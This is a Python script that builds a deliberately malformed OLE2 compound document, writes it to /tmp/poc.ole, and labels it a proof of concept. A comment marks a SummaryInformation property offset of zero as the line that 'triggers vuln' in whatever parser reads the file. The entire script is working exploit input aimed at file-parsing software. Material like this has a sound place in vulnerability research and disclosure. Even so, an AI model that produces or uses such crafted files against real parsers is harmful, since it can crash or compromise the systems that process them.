import struct

def u16(s):
    return s.encode('utf-16-le')

def build():
    # ---- Header (512 bytes) ----
    hdr = bytearray(512)
    hdr[0:8] = bytes([0xD0,0xCF,0x11,0xE0,0xA1,0xB1,0x1A,0xE1])  # magic
    struct.pack_into('<H', hdr, 24, 0x003E)   # revision
    struct.pack_into('<H', hdr, 26, 0x0003)   # version
    struct.pack_into('<H', hdr, 28, 0xFFFE)   # byte order
    struct.pack_into('<H', hdr, 30, 9)        # sec_size_p2 = 512
    struct.pack_into('<H', hdr, 32, 6)        # short_sec_size_p2 = 64
    # unused0 at 34..44 (10 bytes) = 0
    struct.pack_into('<I', hdr, 44, 1)        # num_sectors_in_sat = 1
    struct.pack_into('<I', hdr, 48, 2)        # secid_first_directory = 2
    # unused1 at 52..56 = 0
    struct.pack_into('<I', hdr, 56, 4096)     # min_size_standard_stream
    struct.pack_into('<i', hdr, 60, -2)       # secid_first_sector_in_short_sat = ENDOFCHAIN
    struct.pack_into('<I', hdr, 64, 0)        # num_sectors_in_short_sat
    struct.pack_into('<i', hdr, 68, -2)       # secid_first_sector_in_master_sat = ENDOFCHAIN
    struct.pack_into('<I', hdr, 72, 0)        # num_sectors_in_master_sat
    # master_sat[109] at offset 76
    struct.pack_into('<i', hdr, 76, 1)        # master_sat[0] = FAT at sector 1
    for i in range(1, 109):
        struct.pack_into('<i', hdr, 76 + 4*i, -1)  # FREE

    # ---- FAT sector (sector 1, offset 512) ----
    fat = bytearray(512)
    # entries: 0=FATSECT, 1=FATSECT, 2=ENDOFCHAIN(dir), 3=ENDOFCHAIN(root short stream), 4=ENDOFCHAIN(summary)
    struct.pack_into('<i', fat, 0, -3)   # sector 0 = FATSECT
    struct.pack_into('<i', fat, 4, -3)   # sector 1 = FATSECT
    struct.pack_into('<i', fat, 8, -2)   # sector 2 = ENDOFCHAIN (directory)
    struct.pack_into('<i', fat, 12, -2)  # sector 3 = ENDOFCHAIN (root short stream)
    struct.pack_into('<i', fat, 16, -2)  # sector 4 = ENDOFCHAIN (summary stream)
    for i in range(5, 128):
        struct.pack_into('<i', fat, 4*i, -1)  # FREE

    # ---- Directory sector (sector 2, offset 1024) ----
    dirsec = bytearray(512)

    # Entry 0: Root Storage
    root = bytearray(128)
    name = u16("Root Entry") + b'\x00\x00'
    root[0:len(name)] = name
    struct.pack_into('<H', root, 64, len(name))  # d_namelen
    root[66] = 5   # d_type = ROOT_STORAGE
    root[67] = 1   # d_color = black
    struct.pack_into('<i', root, 68, -1)  # left_child
    struct.pack_into('<i', root, 72, -1)  # right_child
    struct.pack_into('<i', root, 76, 1)   # storage = child entry 1
    struct.pack_into('<i', root, 116, 3)  # d_stream_first_sector = 3 (short stream container)
    struct.pack_into('<I', root, 120, 512) # d_size = 512 (short stream container size)
    dirsec[0:128] = root

    # Entry 1: SummaryInformation stream
    si = bytearray(128)
    siname = b'\x05\x00' + u16("SummaryInformation") + b'\x00\x00'
    si[0:len(siname)] = siname
    struct.pack_into('<H', si, 64, len(siname))  # d_namelen
    si[66] = 2   # d_type = USER_STREAM
    si[67] = 1   # d_color
    struct.pack_into('<i', si, 68, -1)  # left_child
    struct.pack_into('<i', si, 72, -1)  # right_child
    struct.pack_into('<i', si, 76, -1)  # storage
    struct.pack_into('<i', si, 116, 4)  # d_stream_first_sector = 4
    struct.pack_into('<I', si, 120, 4096) # d_size = 4096 (long stream)
    dirsec[128:256] = si

    # ---- Root short stream container (sector 3, offset 1536) ----
    # Not really needed since summary is a long stream, but keep a sector
    shortstream = bytearray(512)

    # ---- SummaryInformation stream (sector 4, offset 2048) ----
    # Build the summary info data
    stream = bytearray(512)
    # summary info header at offset 0
    struct.pack_into('<H', stream, 0, 0xFFFE)  # si_byte_order
    struct.pack_into('<H', stream, 2, 0)       # si_zero
    struct.pack_into('<H', stream, 4, 0)       # si_os_version
    struct.pack_into('<H', stream, 6, 0)       # si_os
    # si_class at 8..24 = 0
    struct.pack_into('<I', stream, 24, 1)      # si_count = 1 section
    # section declaration at offset 0x1c = 28
    # sd_class at 28..44 = 0
    struct.pack_into('<I', stream, 44, 48)     # sd_offset = 48
    # section header at offset 48
    struct.pack_into('<I', stream, 48, 16)     # sh_len = 16
    struct.pack_into('<I', stream, 52, 1)      # sh_properties = 1
    # property array at offset 56
    struct.pack_into('<I', stream, 56, 0)      # pi_id = 0
    struct.pack_into('<I', stream, 60, 0)      # offset = 0  <-- triggers vuln

    out = bytearray()
    out += hdr
    out += fat
    out += dirsec
    out += shortstream
    out += stream
    return bytes(out)

data = build()
with open('/tmp/poc.ole', 'wb') as f:
    f.write(data)
print("wrote", len(data), "bytes")
